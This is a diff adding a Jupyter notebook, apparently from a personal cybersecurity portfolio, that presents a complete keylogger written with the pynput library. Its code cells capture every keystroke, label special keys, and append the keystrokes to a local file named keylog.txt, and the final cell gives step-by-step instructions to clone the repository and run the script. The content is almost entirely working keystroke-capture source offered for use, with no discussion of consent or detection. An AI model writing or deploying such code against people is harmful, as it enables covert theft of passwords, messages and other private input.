@@ -1,1 +1,228 @@
 
+{
+ "cells": [
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "# Keylogger Application\n",
+    "---\n",
+    "This Jupyter Notebook demonstrates a keylogger application using the `pynput` library.\n",
+    "The application logs keys pressed on the keyboard and writes them to a file."
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Import Libraries"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 1,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "from pynput import keyboard"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Define Special Keys Mapping\n",
+    "Mapping special keys for better readability in the log file."
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 2,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "special_keys_mapping = {\n",
+    "    keyboard.Key.space: ' ',\n",
+    "    keyboard.Key.enter: '[ENTER]\\n',\n",
+    "    keyboard.Key.tab: '[TAB]',\n",
+    "    keyboard.Key.backspace: '[BACKSPACE]',\n",
+    "    keyboard.Key.shift: '[SHIFT]',\n",
+    "    keyboard.Key.ctrl_l: '[CTRL]',\n",
+    "    keyboard.Key.ctrl_r: '[CTRL]',\n",
+    "    keyboard.Key.alt_l: '[ALT]',\n",
+    "    keyboard.Key.alt_gr: '[ALT]',\n",
+    "    keyboard.Key.caps_lock: '[CAPSLOCK]',\n",
+    "    keyboard.Key.delete: '[DELETE]',\n",
+    "    keyboard.Key.cmd: '[CMD]',\n",
+    "    keyboard.Key.esc: '[ESC]',\n",
+    "    keyboard.Key.up: '[UP]',\n",
+    "    keyboard.Key.down: '[DOWN]',\n",
+    "    keyboard.Key.left: '[LEFT]',\n",
+    "    keyboard.Key.right: '[RIGHT]',\n",
+    "    keyboard.Key.page_up: '[PAGE UP]',\n",
+    "    keyboard.Key.page_down: '[PAGE DOWN]',\n",
+    "    keyboard.Key.home: '[HOME]',\n",
+    "    keyboard.Key.end: '[END]',\n",
+    "    keyboard.Key.insert: '[INSERT]',\n",
+    "    keyboard.Key.menu: '[MENU]',\n",
+    "    keyboard.Key.media_play_pause: '[PLAY/PAUSE]',\n",
+    "    keyboard.Key.media_volume_mute: '[VOLUME MUTE]',\n",
+    "    keyboard.Key.media_volume_up: '[VOLUME UP]',\n",
+    "    keyboard.Key.media_volume_down: '[VOLUME DOWN]',\n",
+    "    keyboard.Key.media_next: '[NEXT TRACK]',\n",
+    "    keyboard.Key.media_previous: '[PREVIOUS TRACK]',\n",
+    "    keyboard.Key.f1: '[F1]',\n",
+    "    keyboard.Key.f2: '[F2]',\n",
+    "    keyboard.Key.f3: '[F3]',\n",
+    "    keyboard.Key.f4: '[F4]',\n",
+    "    keyboard.Key.f5: '[F5]',\n",
+    "    keyboard.Key.f6: '[F6]',\n",
+    "    keyboard.Key.f7: '[F7]',\n",
+    "    keyboard.Key.f8: '[F8]',\n",
+    "    keyboard.Key.f9: '[F9]',\n",
+    "    keyboard.Key.f10: '[F10]',\n",
+    "    keyboard.Key.f11: '[F11]',\n",
+    "    keyboard.Key.f12: '[F12]',\n",
+    "}"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Initialize Global Variables\n",
+    "Global list to store pressed keys."
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 3,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "pressed_keys = []"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Define Function to Write Logged Keys to a File\n",
+    "The `write_to_file` function writes logged keys to a file named `keylog.txt`."
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 4,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "def write_to_file(keys):\n",
+    "    with open(\"keylog.txt\", \"a\") as f:\n",
+    "        for key in keys:\n",
+    "            if key in special_keys_mapping:\n",
+    "                f.write(special_keys_mapping[key])\n",
+    "            else:\n",
+    "                f.write(str(key).replace(\"'\", \"\"))  # Remove single quotes around keys\n",
+    "        f.write(\"\\n\")  # Separate each entry with a newline"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Define Function to Handle Key Press Events\n",
+    "The `on_press` function logs key press events and calls `write_to_file` function every 10 keys."
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 5,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "def on_press(key):\n",
+    "    global pressed_keys\n",
+    "    try:\n",
+    "        # Logging pressed key\n",
+    "        pressed_keys.append(key)\n",
+    "        # Write to file every 10 keys (you can adjust this as needed)\n",
+    "        if len(pressed_keys) >= 10:\n",
+    "            write_to_file(pressed_keys)\n",
+    "            pressed_keys = []\n",
+    "    except AttributeError:\n",
+    "        # Logging special keys (e.g., shift, ctrl, etc.)\n",
+    "        pressed_keys.append(key)"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Set Up Listener for Key Press Events\n",
+    "The following code sets up the listener for key press events and starts it."
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 6,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "with keyboard.Listener(on_press=on_press) as listener:\n",
+    "    listener.join()"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Usage Instructions\n",
+    "### Downloading and Running the Code\n",
+    "1. **Install Git:** If you don't have Git installed, download and install it from [git-scm.com](https://git-scm.com/).\n",
+    "2. **Clone the Repository:**\n",
+    "   - Open a terminal or command prompt.\n",
+    "   - Navigate to the directory where you want to clone the repository.\n",
+    "   - Run the following command to clone the repository:\n",
+    "     ```sh\n",
+    "     git clone https://github.com/muhammadalhayani/Cyber-Security-Portfolio.git\n",
+    "     ```\n",
+    "3. **Navigate to the Cloned Repository:**\n",
+    "   ```sh\n",
+    "   cd Cyber-Security-Portfolio/Python-Tools\n",
+    "   ```\n",
+    "4. **Run the Script:**\n",
+    "   - Ensure you have the required library installed. You can install it using pip:\n",
+    "     ```sh\n",
+    "     pip install pynput\n",
+    "     ```\n",
+    "   - Run the Python script:\n",
+    "     ```sh\n",
+    "     python keylogger.py\n",
+    "     ```\n",
+    "5. **Follow the Prompts:** The keylogger will start running and logging key presses to `keylog.txt`."
+   ]
+  }
+ ],
+ "metadata": {
+  "kernelspec": {
+   "display_name": "Python 3",
+   "language": "python",
+   "name": "python3"
+  },
+  "language_info": {
+   "codemirror_mode": {
+    "name": "ipython",
+    "version": 3
+   },
+   "file_extension": ".py",
+   "mimetype": "text/x-python",
+   "name": "python",
+   "nbconvert_exporter": "python",
+   "pygments_lexer": "ipython3",
+   "version": "3.8.5"
+  }
+ },
+ "nbformat": 4,
+ "nbformat_minor": 5
+}
